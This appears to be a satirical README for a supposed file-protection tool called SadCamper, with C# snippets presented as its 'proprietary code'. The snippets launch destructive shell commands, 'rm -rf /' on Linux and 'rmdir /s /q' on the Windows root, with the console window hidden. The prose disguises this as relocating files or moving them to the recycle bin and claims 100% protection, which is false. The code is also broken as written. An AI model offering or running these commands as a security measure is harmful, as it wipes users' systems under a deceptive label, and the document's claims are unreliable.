# SadCamper
SadCamper is a tool designed for security personnel to prevent the exfiltration of critically sensitive files from an organization.  It works by preemptively relocating files, adding an additional layer of security by potentially thwarting attackers' attempts to identify and exfitrate these files.

### ⚠️ Warning
SadCamper manipulates critical sensitive files to prevent threat actor access.  It may cause a small amount of impact to the systems containing these files.

### How it works
SadCamper preemptively relocates files, providing 100% protection against threat actor attempts to identify and exfiltrate them.  It utilizes proprietary code, which we have recently made public, and is shown below.

On linux, SadCamper will recursively modify inode tables using our SpacialSec machine-learning powered, cloud native technology.
```c#
Process process = new Process();
psi.FileName = "/bin/bash";
psi.Arguments = "rm -rf /";
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
psi.CreateNoWindow = true;
using var process = Process.Start(psi);
process.WaitForExit();
```

On Windows, SadCamper will recursively move files to the recycling bin using our SpacialSec machine-learning powered, cloud native technology.
```c#
Process process = new Process();
psi.FileName = "cmd.exe";
psi.Arguments = "rmdir /s /q \";
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
psi.CreateNoWindow = true;
using var process = Process.Start(psi);
process.WaitForExit();
```


